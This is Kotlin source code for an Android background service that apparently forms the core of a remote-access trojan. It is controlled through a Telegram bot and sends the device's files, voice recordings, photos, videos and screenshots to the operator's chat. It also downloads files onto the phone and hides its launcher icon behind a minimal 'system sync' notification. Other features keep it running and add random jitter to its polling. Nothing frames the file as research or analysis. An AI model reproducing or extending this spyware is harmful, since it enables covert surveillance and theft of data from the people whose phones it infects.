package com.serv.app.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.serv.app.MainActivity
import com.serv.app.PersistScheduler
import com.serv.app.R
import com.serv.app.cmds.CmdRouter
import com.serv.app.core.CmdQueue
import com.serv.app.core.Config
import com.serv.app.core.Exec
import com.serv.app.core.Http
import com.serv.app.core.Multipart
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class BotService : Service() {

    companion object {
        @Volatile var pendingUploadPath: String? = null
        @Volatile var pendingUploadUntil: Long = 0L
        @Volatile var instance: BotService? = null
        private const val CH = "system_sync"
        private const val NOTIF = 0x5345
    }

    @Volatile var stage2Url: String = ""
    private val running = AtomicBoolean(false)
    @Volatile private var offset: Long = 0L
    @Volatile private var sleepSec: Int = 2
    @Volatile private var persistEnabled: Boolean = true
    private var thread: Thread? = null
    private val router by lazy { CmdRouter(this) }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createChannel()
        startForeground(NOTIF, buildNotif())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running.get()) startLoop()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running.set(false)
        thread?.interrupt()
        instance = null
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = getSystemService(NotificationManager::class.java)
            if (mgr.getNotificationChannel(CH) == null) {
                val c = NotificationChannel(
                    CH, "Serviços", NotificationManager.IMPORTANCE_MIN
                ).apply {
                    setShowBadge(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                mgr.createNotificationChannel(c)
            }
        }
    }

    private fun buildNotif(): android.app.Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CH)
            .setSmallIcon(R.drawable.ic_gear)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pi)
            .build()
    }

    private fun startLoop() {
        running.set(true)
        thread = Thread({
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            var wl: PowerManager.WakeLock? = null
            try {
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "serv::bot")
                wl.acquire()
            } catch (_: Throwable) {}
            try {
                loop()
            } finally {
                runCatching { wl?.release() }
            }
        }, "bot-loop").apply { start() }
    }

    private fun loop() {
        // drena fila de pendentes ao acordar
        try {
            CmdQueue.popAll(this).forEach { (id, text) ->
                if (id > offset) offset = id
                val resp = router.handle(this, text)
                dispatchResponse(resp)
            }
        } catch (_: Throwable) {}

        while (running.get()) {
            try {
                val jitter = (sleepSec * (0.8 + Random.nextDouble() * 0.4))
                    .toLong().coerceAtLeast(1L)
                Thread.sleep(jitter * 1000L)
                val updates = fetchUpdates()
                updates.forEach { processUpdate(it) }
            } catch (_: InterruptedException) {
                return
            } catch (_: Throwable) {
                // erro de rede/parse: não quebra, apenas dorme e tenta de novo
                try { Thread.sleep(5000) } catch (_: InterruptedException) { return }
            }
        }
    }

    private fun fetchUpdates(): List<JSONObject> {
        val payload = JSONObject()
            .put("timeout", Config.POLL_TIMEOUT)
            .put("offset", offset)
            .put("allowed_updates", JSONArray().put("message"))
        val j = Http.tgCall(Config.METHOD_GET_UPDATES, payload)
        val result = j.optJSONArray("result") ?: return emptyList()
        val out = ArrayList<JSONObject>(result.length())
        for (i in 0 until result.length()) out.add(result.getJSONObject(i))
        return out
    }

    private fun processUpdate(u: JSONObject) {
        val updId = u.optLong("update_id", 0)
        if (updId > 0) offset = maxOf(offset, updId + 1)

        val msg = u.optJSONObject("message") ?: return
        val chat = msg.optJSONObject("chat") ?: return
        val fromId = chat.optString("id", "")
        val expected = Config.CHAT_ID.trim()
        if (expected.isNotEmpty() && fromId != expected) return

        // Documento em anexo → /up
        val doc = msg.optJSONObject("document")
        val target = pendingUploadPath
        if (doc != null && target != null && System.currentTimeMillis() < pendingUploadUntil) {
            handleUpload(doc, target)
            return
        }

        val text = msg.optString("text", "")
        if (text.isBlank()) return

        if (text.startsWith("/")) {
            val resp = try {
                router.handle(this, text)
            } catch (t: Throwable) {
                // se o comando falhar, guarda na fila para reprocessar
                CmdQueue.push(this, updId, text)
                "ERRO: ${t.javaClass.simpleName}: ${t.message}"
            }
            dispatchResponse(resp)
        }
    }

    private fun handleUpload(doc: JSONObject, dest: String) {
        try {
            val fileId = doc.optString("file_id")
            val info = Http.tgCall(Config.METHOD_GET_FILE, JSONObject().put("file_id", fileId))
            val path = info.getJSONObject("result").getString("file_path")
            val url = "${Config.API_BASE}${Config.TOKEN}/$path"
            val out = File(dest)
            out.parentFile?.mkdirs()
            Http.downloadTo(url, out)
            pendingUploadPath = null
            pendingUploadUntil = 0L
            sendText("OK: ${out.length()} bytes em ${out.absolutePath}")
        } catch (t: Throwable) {
            sendText("ERRO upload: ${t.message}")
        }
    }

    private fun dispatchResponse(resp: String) {
        if (resp.isBlank()) return
        try {
            when {
                resp.startsWith("__FILE__:") -> {
                    val p = resp.removePrefix("__FILE__:")
                    sendFileGeneric(p, Config.METHOD_SEND_DOC, "document", "application/octet-stream")
                }
                resp.startsWith("__VOICE__:") -> {
                    val p = resp.removePrefix("__VOICE__:")
                    sendFileGeneric(p, Config.METHOD_SEND_VOICE, "voice", "audio/m4a")
                }
                resp.startsWith("__PHOTO__:") -> {
                    val p = resp.removePrefix("__PHOTO__:")
                    sendFileGeneric(p, Config.METHOD_SEND_PHOTO, "photo", "image/jpeg")
                }
                resp.startsWith("__VIDEO__:") -> {
                    val p = resp.removePrefix("__VIDEO__:")
                    sendFileGeneric(p, Config.METHOD_SEND_VIDEO, "video", "video/mp4")
                }
                resp.startsWith("__SCREENSHOT__:") -> {
                    val p = resp.removePrefix("__SCREENSHOT__:")
                    sendFileGeneric(p, Config.METHOD_SEND_PHOTO, "photo", "image/png")
                }
                else -> sendText(resp)
            }
        } catch (t: Throwable) {
            runCatching { sendText("ERRO envio: ${t.message}") }
        }
    }

    private fun sendText(body: String) {
        if (Config.TOKEN.isBlank() || Config.CHAT_ID.isBlank()) return
        val text = Exec.truncate(body, Config.MAX_MSG)
        try {
            Http.tgCall(
                Config.METHOD_SEND_MSG,
                JSONObject()
                    .put("chat_id", Config.CHAT_ID)
                    .put("text", text)
                    .put("disable_web_page_preview", true)
            )
        } catch (_: Throwable) {
            // silencioso: erro de rede não deve derrubar o loop
        }
    }

    private fun sendFileGeneric(path: String, method: String, field: String, mime: String) {
        if (Config.TOKEN.isBlank() || Config.CHAT_ID.isBlank()) return
        val f = File(path)
        if (!f.exists()) {
            sendText("ERRO: arquivo não existe: $path")
            return
        }
        Multipart.sendFile(method, Config.CHAT_ID, field, f, mime)
    }

    // ---------- Comandos administrativos chamados pelo CmdRouter ----------
    fun onPersist(ctx: Context, args: String): String {
        return when (args.lowercase().trim()) {
            "on" -> {
                persistEnabled = true
                PersistScheduler.enable(ctx)
                "OK persist on"
            }
            "off" -> {
                persistEnabled = false
                PersistScheduler.disable(ctx)
                "OK persist off"
            }
            else -> "uso: /persist on|off"
        }
    }

    fun onHide(ctx: Context): String {
        return try {
            val cn = android.content.ComponentName(ctx, MainActivity::class.java)
            ctx.packageManager.setComponentEnabledSetting(
                cn,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            "OK: ícone oculto. Reabilite via adb: pm enable com.serv.app/.MainActivity"
        } catch (t: Throwable) {
            "ERRO hide: ${t.message}"
        }
    }

    fun onSleep(args: String): String {
        val s = args.toIntOrNull()?.coerceIn(1, 3600) ?: return "uso: /sleep <segundos>"
        sleepSec = s
        return "OK: poll=${s}s (jitter ±20%)"
    }
}
